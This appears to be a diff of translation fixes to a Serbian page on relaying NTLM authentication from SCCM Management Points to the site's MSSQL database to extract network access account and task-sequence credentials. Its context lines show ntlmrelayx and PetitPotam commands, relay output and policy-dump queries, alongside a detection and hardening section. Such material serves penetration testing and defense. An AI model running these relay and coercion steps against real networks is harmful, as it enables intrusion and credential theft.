@@ -26,7 +26,7 @@ MP ISAPI ekstenzija **GetAuth.dll** izlaže nekoliko parametara koji ne zahtevaj
 | Parameter | Purpose |
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | Vraća javni ključ sertifikata za potpisivanje sajta + GUID-ove *x86* / *x64* **All Unknown Computers** uređaja. |
-| `MPLIST` | Lista svaki Management-Point u sajtu. |
+| `MPLIST` | Lista svaki Management Point na sajtu. |
 | `SITESIGNCERT` | Vraća sertifikat za potpisivanje Primarnog Sajta (identifikuje server sajta bez LDAP). |
 
 Zgrabite GUID-ove koji će delovati kao **clientID** za kasnije DB upite:
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Kada se primorač aktivira, trebali biste videti nešto poput:
+Kada se primoravanje aktivira, trebali biste videti nešto poput:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -72,9 +72,9 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 Svaki red sadrži `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
 
 Fokusirajte se na politike:
-* **NAAConfig**  – Akreditivi za nalog za pristup mreži
-* **TS_Sequence** – Varijable sekvence zadatka (OSDJoinAccount/Password)
-* **CollectionSettings** – Mogu sadržati naloge za izvršavanje
+* **NAAConfig**  – kredencijali za nalog za pristup mreži
+* **TS_Sequence** – varijable sekvence zadatka (OSDJoinAccount/Password)
+* **CollectionSettings** – može sadržati naloge za izvršavanje
 
 ### 3.3  Preuzmite puni sadržaj
 Ako već imate `PolicyID` i `PolicyVersion`, možete preskočiti zahtev za clientID koristeći:
@@ -127,7 +127,7 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 6. Detekcija i Ojačavanje
-1. **Pratite MP prijave** – bilo koji MP račun računara koji se prijavljuje sa IP adrese koja nije njegova domaćin ≈ relj.
+1. **Pratite MP prijave** – bilo koji MP račun računara koji se prijavljuje sa IP adrese koja nije njegova domaćin ≈ relay.
 2. Omogućite **Proširenu zaštitu za autentifikaciju (EPA)** na bazi podataka sajta (`PREVENT-14`).
 3. Onemogućite neiskorišćeni NTLM, primenite SMB potpisivanje, ograničite RPC (
 iste mere zaštite korišćene protiv `PetitPotam`/`PrinterBug`).
@@ -136,7 +136,7 @@ iste mere zaštite korišćene protiv `PetitPotam`/`PrinterBug`).
 ---
 
 ## Takođe pogledajte
-* Osnovi NTLM relja:
+* Osnovi NTLM relaya:
 
 {{#ref}}
 ../ntlm/README.md
@@ -151,7 +151,7 @@ abusing-ad-mssql.md
 
 
 ## Reference
-- [Želeo bih da razgovaram sa vašim menadžerom: Krađa tajni pomoću relja tačaka upravljanja](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Želeo bih da razgovaram sa vašim menadžerom: Krađa tajni pomoću relaya tačaka upravljanja](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [Menadžer pogrešnih konfiguracija – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
